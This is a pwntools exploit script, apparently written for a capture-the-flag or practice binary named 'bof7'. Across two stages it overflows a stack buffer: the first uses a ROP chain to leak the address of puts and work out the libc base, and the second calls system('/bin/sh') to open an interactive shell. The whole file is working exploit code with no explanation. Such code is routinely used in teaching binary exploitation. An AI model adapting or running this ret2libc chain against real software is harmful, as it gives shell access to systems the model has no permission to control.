#!/usr/bin/python3

from pwn import *

p = process('./bof7')
exe = ELF('./bof7', checksec=False)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

#register
pop_rdi = 0x0000000000401263
ret = 0x000000000040101a
#input()
#payload
payload = b'a'*88
payload += p64(pop_rdi)
payload += p64(exe.got['puts']) + p64(exe.plt['puts'])
payload += p64(exe.sym['main'])
p.sendafter(b': \n', payload)

leak = u64(p.recv(6) + b'\00\00')
libc.address = leak - libc.sym['puts']
log.info("leak: " + hex(leak))
log.info("libc_base: " + hex(libc.address))

payload = b'a'*88 + p64(pop_rdi) + p64(next(libc.search(b'/bin/sh'))) + p64(ret) + p64(libc.sym['system'])
p.sendafter(b': \n', payload)

p.interactive()

# system('/bin/sh')
# libc_base=libc_leak - libc[]
